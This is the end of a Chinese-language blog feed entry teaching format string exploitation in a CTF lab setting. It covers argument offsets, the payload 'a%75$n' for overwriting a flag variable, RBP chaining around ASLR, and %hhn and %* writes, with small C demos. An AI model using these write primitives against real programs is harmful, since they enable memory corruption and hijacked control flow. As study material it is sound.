data-src="https://arch3rn4r.github.io/picx-images-hosting/20240916/Aspose.Words.00c8d2b0-d3ea-49b3-a811-c95ac2af2b92.004.2donm8ytr8.webp"                                        ></p><p>当printf向前查找参数时，步长为8字节（一个参数8字节）0x228 &#x2F;0x8&#x3D;69，第六个参数是第一个栈上的参数，69+6&#x3D;75，我们可以认为从printf的角度看，print_flag是它的第75个参数</p><p>.&#x2F;do ‘a%75$n’ 可以把a的长度1输入到第75个参数位置上，这样就能达成读取文件的目的</p><p>输出了a和一些buf中未初始化的内容</p><p><img                         lazyload                       alt="image"                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240916/Aspose.Words.00c8d2b0-d3ea-49b3-a811-c95ac2af2b92.005.7sn64oe0wm.webp"                                        ></p><h3 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h3><ul><li>rbp原理</li></ul><p>栈上保存的RBP指向前一个栈帧的RBP，能在字符串漏洞中利用，找到第一个保存的RBP，这里的ebp1的距离，ebp1指向一个地址，这里是ebp2,所以可以编写一个漏洞，写入数据到ebp1指向的地址既ebp2,然后就可以找到ebp2的距离（找写入值在第几个参数，再写入数据到ebp2指向的地址。</p><p>这样就可以通过ebp1将真正想要写入的地址写到ebp2,再通过ebp2写入数据到我们选定的地址。通过这样的方法，尽管有ASLR,我们还是能写</p><p><img                         lazyload                       alt="image"                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240916/Aspose.Words.00c8d2b0-d3ea-49b3-a811-c95ac2af2b92.006.92q3azw1tw.webp"                                        ></p><ul><li>当格式化字符串的缓冲区在栈上时，我们可以控制格式化字符串缓冲区</li></ul><p>在printf被调用时，发生了什么</p><p><img                         lazyload                       alt="image"                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240916/Aspose.Words.00c8d2b0-d3ea-49b3-a811-c95ac2af2b92.007.6m3uw2p7kl.webp"                                        ></p><p>格式化字符串下会有一个栈帧（不是紧挨着),这意味着应该能找到从RSP到格式化字符串缓冲区的偏移量，</p><p><img                         lazyload                       alt="image"                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240916/Aspose.Words.00c8d2b0-d3ea-49b3-a811-c95ac2af2b92.008.2vepau0dvq.webp"                                        ></p><ul><li>写入更多字节</li></ul><p>%n只能写入4字节，但如果想写入更多字节呢</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%ln   <span class="number">8b</span>ytes</span><br><span class="line">%hn   <span class="number">2b</span>ytes</span><br><span class="line">%hhn  <span class="number">1b</span>ytes</span><br></pre></td></tr></table></figure><ul><li>写入特定字节</li></ul><p>可以利用printf的另一个特性——填充 参考printf的man page,命令为：<code>man 3 printf</code></p><p>这里提供了一个比较大的填充，所以会在16进制数前输出大量空白字符，这些都会输出到标准输出。printf的第二个替换符是%1$n,这里表示引用第一个参数既buf,但因为后面有个n,这个替换符将把已输出的字节长度写入buf,</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> **argv)</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">4</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%1145258561x%1$n&quot;</span>, buf);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n\n\n&quot;</span>);</span><br><span class="line">write(<span class="number">1</span>,buf,<span class="number">4</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数据关系如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HEX  <span class="number">4443</span> <span class="number">4241</span></span><br><span class="line">DEC  <span class="number">1</span>,<span class="number">145</span>,<span class="number">258</span>,<span class="number">561</span></span><br></pre></td></tr></table></figure><p>按小端序写入 <code>buf</code> 后，就是41，42，43，44，分别对应ABCD,最终write(1, buf, 4) 输出这 4 个字节</p><p><img                         lazyload                       alt="image"                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240916/Aspose.Words.00c8d2b0-d3ea-49b3-a811-c95ac2af2b92.009.3d4qzf1svn.webp"                                        ></p><p>但这个非常耗时间，填充了1,145,258,561，这还只是4字节，如果要写入一个8字节地址更费时间</p><ul><li>写入更多特定字节</li></ul><p>这个方法不需要输入太多填充空白字节</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buf[<span class="number">4</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%65x%1$hhn%c%2$hhn%c%3$hhn%c%4$hhn&quot;</span>, buf, buf+<span class="number">1</span>, buf+<span class="number">2</span>, buf+<span class="number">3</span>);</span><br></pre></td></tr></table></figure><p>逐步分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">65</span>x：</span><br><span class="line">输出 <span class="number">65</span> 个字符（通常是空格），使得当前已经输出的字符数为 <span class="number">65</span>。</span><br><span class="line">%<span class="number">1</span>$hhn：</span><br><span class="line">%n 占位符会将目前输出的字符数写入指定的内存地址。</span><br><span class="line">%<span class="number">1</span>$hhn 这里表示将**已经输出的字符数（<span class="number">65</span>）**的低 <span class="number">8</span> 位写入 buf[<span class="number">0</span>]（即 buf 的第一个字节）。</span><br><span class="line">结果是 buf[<span class="number">0</span>] 将存储值 <span class="number">65</span>，即字符 <span class="string">&#x27;A&#x27;</span>（ASCII 码 <span class="number">65</span>）。</span><br><span class="line">%c：</span><br><span class="line">这是一个普通字符输出占位符，用于将参数中的字符输出到终端。</span><br><span class="line">第一个 %c 对应 buf+<span class="number">1</span>，buf+<span class="number">1</span> 的初始值未定义，因此输出的字符是不确定的。</span><br><span class="line">%<span class="number">2</span>$hhn：</span><br><span class="line">将**当前输出的字符数（<span class="number">66</span>）**写入 buf[<span class="number">1</span>]（第二个字节）。</span><br><span class="line">结果是 buf[<span class="number">1</span>] 将存储值 <span class="number">66</span>，即字符 <span class="string">&#x27;B&#x27;</span>（ASCII 码 <span class="number">66</span>）。</span><br><span class="line">%c：</span><br><span class="line">输出 buf+<span class="number">2</span> 的值，未定义，输出的字符不确定。</span><br><span class="line">%<span class="number">3</span>$hhn：</span><br><span class="line">将**当前输出的字符数（<span class="number">67</span>）**写入 buf[<span class="number">2</span>]（第三个字节）。</span><br><span class="line">结果是 buf[<span class="number">2</span>] 将存储值 <span class="number">67</span>，即字符 <span class="string">&#x27;C&#x27;</span>（ASCII 码 <span class="number">67</span>）。</span><br><span class="line">%c：</span><br><span class="line">输出 buf+<span class="number">3</span> 的值，未定义，输出的字符不确定。</span><br><span class="line">%<span class="number">4</span>$hhn：</span><br><span class="line">将**当前输出的字符数（<span class="number">68</span>）**写入 buf[<span class="number">3</span>]（第四个字节）。</span><br><span class="line">结果是 buf[<span class="number">3</span>] 将存储值 <span class="number">68</span>，即字符 <span class="string">&#x27;D&#x27;</span>（ASCII 码 <span class="number">68</span>）。</span><br></pre></td></tr></table></figure><p><img                         lazyload                       alt="image"                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240916/Aspose.Words.00c8d2b0-d3ea-49b3-a811-c95ac2af2b92.010.1e8k92wc7c.webp"                                        ></p><p>需要注意的是，ABCD是递增的，这样构造格式化字符串相对简单，但如果是要写DCBA这种递减的值呢</p><ul><li>动态填充大小</li></ul><p>动态填充大小用*指定，它能让你不再依靠硬编码指定填充长度，你可以在另一个参数中指定填充长度，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%*<span class="number">10</span>$c%<span class="number">11</span>$n</span><br></pre></td></tr></table></figure><p><code>%*10$c</code>会把第十个参数当作一个数字，表示需要在c前填充的空白字节长度</p><p><code>11$n</code>会将已输出的字节数写入到给定地址，这会把这个计数写到第十一个参数指定的地址。这直接能拷贝内存了（10th的值拷到了11th的地址处）</p><p>假设第 10 个参数的值为 100，第 11 个参数指向一个重要的内存地址，比如栈上保存的返回地址或者全局变量的地址。那么这条指令会在输出了 100 个字符之后，将字符数（比如 100）写入第 11 个参数指向的内存地址，这可能导致程序行为异常或者被攻击者控制</p><p>但这个用法不太实际，这里不好一次只写一个字节，如果尝试使用这种技术复制整个地址，会输出大量内容。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a class="link"   href="https://ciphersaw.me/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit/" >https://ciphersaw.me/ctf-wiki/pwn/linux/fmtstr/fmtstr_exploit/<i class="fas fa-external-link-alt"></i></a></p><p><a class="link"   href="https://pwn.college/software-exploitation/format-string-exploits/" >https://pwn.college/software-exploitation/format-string-exploits/<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;p&gt;首先来看printf,这是常用的格式化字符串函数，以下是常见用法，能利用%s,%d等来替换不同的值&lt;/p&gt;
&lt;figure class=&quot;h</summary>
      
    
    
    
    
  </entry>
  
</feed>
